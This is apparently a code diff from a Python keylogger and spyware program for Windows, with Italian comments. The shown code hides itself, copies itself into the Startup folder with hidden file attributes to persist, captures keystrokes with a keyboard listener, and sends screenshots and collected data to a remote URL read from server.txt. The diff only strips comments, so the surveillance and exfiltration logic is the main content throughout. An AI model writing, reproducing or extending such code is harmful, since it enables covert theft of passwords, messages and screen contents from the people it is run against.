@@ -11,7 +11,7 @@ import ctypes
 import sys
 import shutil
 import subprocess
-import time   # <--- aggiunto per usare sleep nei loop
+import time 
 
 FILE_ATTRIBUTE_HIDDEN = 0x02
 
@@ -21,7 +21,6 @@ def Hide():
 
 Hide()
 
-# --- 1. Gestione chiara di public_url ---
 try:
     with open("server.txt", "r") as f:
         public_url = f.read().strip()
@@ -36,11 +35,9 @@ def copia_in_startup_e_rilancia():
     exe_name = os.path.basename(sys.argv[0])
     startup_path = os.path.join(startup_dir, exe_name)
 
-    # Copia server.txt in Startup
     shutil.copy2("server.txt", startup_dir)
     ctypes.windll.kernel32.SetFileAttributesW(startup_path, FILE_ATTRIBUTE_HIDDEN)
 
-    # Persistenza del programma
     if sys.argv[0] != startup_path:
         shutil.copy2(sys.argv[0], startup_path)
         ctypes.windll.kernel32.SetFileAttributesW(startup_path, FILE_ATTRIBUTE_HIDDEN)
@@ -67,7 +64,6 @@ def capture_and_send_screenshot():
     except Exception as e:
         print("Errore invio screenshot:", e)
 
-# --- 3. Loop invece di Timer ricorsivi ---
 def schedule_screenshot():
     while True:
         capture_and_send_screenshot()
@@ -106,9 +102,9 @@ def on_press(key):
     except Exception:
         pass
 
-# Avvio thread paralleli per invio dati e screenshot
 threading.Thread(target=send_post_req, daemon=True).start()
 threading.Thread(target=schedule_screenshot, daemon=True).start()
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
+
